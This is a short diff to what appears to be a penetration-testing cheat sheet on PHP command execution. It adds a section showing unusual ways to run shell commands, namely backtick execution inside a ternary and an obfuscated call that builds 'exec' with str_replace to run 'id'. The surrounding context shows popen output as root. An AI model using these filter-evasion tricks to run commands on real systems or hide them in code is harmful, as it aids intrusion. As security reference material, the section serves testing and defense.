@@ -89,6 +89,14 @@ php > popen('id', 'w');
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+## Weird ways to execute PHP
+```php
+// ternary operator
+1?`id`:1;
+// some obfuscation: equivalent to exec
+str_replace('z', 'e', 'zxzc')("id");
+```
+
 ---
 
 ## PHP Execution: `Preg_replace` (PHP 4, PHP 5, PHP 7, PHP 8)
